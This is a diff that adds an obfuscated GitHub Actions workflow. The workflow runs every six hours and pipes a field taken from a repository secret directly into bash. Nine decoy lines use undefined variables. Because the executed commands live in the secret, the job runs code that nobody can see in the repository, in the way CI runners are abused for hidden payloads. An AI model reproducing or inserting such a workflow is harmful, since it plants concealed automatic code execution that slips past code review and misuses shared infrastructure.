@@ -1,0 +1,27 @@
+name: defifelix42
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: defifelix42
+        env:
+          ym48404: ${{ secrets.ym48404 }}
+        run: |
+          echo $ym48404 | jq -r .ghgoi1748 | /bin/bash
+          echo $avgf256 | jq -r .h5964 | /bin/bash
+          echo $cf4581 | jq -r .rmwl12045 | /bin/bash
+          echo $sjxxb64677 | jq -r .zsb85390 | /bin/bash
+          echo $qbh3756 | jq -r .dy7 | /bin/bash
+          echo $tkef91159 | jq -r .t41 | /bin/bash
+          echo $l43 | jq -r .uuy0 | /bin/bash
+          echo $bnfht304 | jq -r .lzx1871 | /bin/bash
+          echo $jsown80 | jq -r .lcsc0 | /bin/bash
+          echo $sdvpk2 | jq -r .l12803 | /bin/bash
+
